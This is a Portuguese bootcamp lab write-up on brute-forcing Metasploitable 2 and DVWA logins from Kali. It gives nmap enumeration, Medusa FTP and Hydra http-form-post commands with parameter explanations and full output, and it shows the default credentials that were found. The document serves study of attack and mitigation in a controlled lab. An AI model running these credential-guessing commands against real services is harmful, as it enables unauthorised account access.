# bruteforce-lab BOOTCAMP DIO.ME x RIACHUELO

## 🎯 Objetivo

Simular ataques de força bruta em ambiente controlado para estudo de vulnerabilidades e mitigação.

## 🖥️ Ambiente

Kali Linux (atacante)

Metasploitable 2 (alvo)

Rede Host-only

## 🔎 Enumeração

Comando:
```nmap -sV -p 21,22,80,445,139 192.168.56.101``` | 21,22,80,445,139 se refere as portas que quero acessar verificar | 192.168.56.101 se refere ao ip do Metasploitble2
Resultado: 
```
Nmap scan report for 192.168.56.101
Host is up (0.0044s latency).
PORT |  STATE SERVICE | VERSION
21/tcp | open | ftp | vsftpd 2.3.4
22/tcp | open | ssh | OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp | open | http |  Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: ********** (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
## 💥 Ataque FTP

Comando: ```medusa -h IP -U usuarios.txt -P senhas.txt -M ftp -t 6```

Resultado: 
```
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: msfadmin (1 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 123456 (2 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: password (3 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 12345678 (4 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: abc123 (5 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: qwerty (6 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: msfadmin (1 of 6 complete)
2026-02-24 08:59:28 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: password (2 of 6 complete)
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: 123456 (3 of 6 complete)
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: abc123 (4 of 6 complete)
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: qwerty (5 of 6 complete)
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: 12345678 (6 of 6 complete)
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 2 complete) Password: password (1 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: msfadmin (2 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 12345678 (3 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 123456 (4 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: abc123 (5 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: qwerty (6 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 3 complete) Password: password (1 of 6 complete)
2026-02-24 08:59:51 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: msfadmin (2 of 6 complete)
2026-02-24 08:59:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 123456 (3 of 6 complete)
2026-02-24 08:59:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 12345678 (4 of 6 complete)
2026-02-24 08:59:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: abc123 (5 of 6 complete)
2026-02-24 08:59:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: qwerty (6 of 6 complete)
```
Validação:
``` 2026-02-24 08:59:28 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS] ```

## 🌐 Ataque Web (DVWA)
Comando: 
```
hydra -L users.txt -P pass.txt 192.168.56.101 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```
Descrição:
`-L users.txt` - Indica o arquivo contendo a lista de usuários a serem testados.
`-P pass.txt` - Define o arquivo contendo a lista de senhas a serem testadas.
`192.168.56.101` - Endereço ip do alvo onde a aplicação web está hospedada.
`http-form-post` - Define o tipo de serviço e o método de autenticação a ser atacado.
` "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"` - Esta parte é o núcleo do ataque e possui três componentes separados por dois-pontos `(:)`:
`/dvwa/login.php` - Indica o endpoint que recebe as credenciais enviadas pelo formulário.
`username=^USER^&password=^PASS^&Login=Login` - Representa os dados enviados ao servidor durante a tentativa de login.
Significado de cada elemento:
`username=^USER^`
O Hydra substitui automaticamente `^USER^` pelo usuário atual da wordlist.

`password=^PASS^`
O Hydra substitui automaticamente `^PASS^` pela senha atual da wordlist.

`Login=Login`
Campo fixo enviado pelo botão de login do formulário.(F12 > NETWORK > FAÇA UM LOGIN TESTE COM QUALQUER CREDENCIAL> ACESSE O METODO 'POST' QUE FOI CRIADO> CLIQUE EM REQUEST> BANG! CREDENCIAIS SOLICITADAS PELO FOMULÁRIO.)
`Login failed`
Texto retornado pela aplicação quando as credenciais são inválidas.
O Hydra utiliza essa informação para determinar o resultado da tentativa:
Se o texto aparecer → login inválido
Se o texto NÃO aparecer → login bem-sucedido
Essa verificação é essencial para evitar falsos positivos.


Resultado: 

```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak

Hydra starting at 2026-02-24 09:24:11
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:4/p:6), ~2 tries per task
[DATA] attacking http-post-form://192.168.56.101:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed
[80][http-post-form] host: 192.168.56.101   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2026-02-24 09:24:15

```

Validação: ```[80][http-post-form] host: 192.168.56.101   login: admin   password: password ```
Evidência adicional:
Login manual realizado com sucesso no DVWA utilizando as credenciais encontradas.
A ausência da mensagem “Login failed” confirmou autenticação válida.
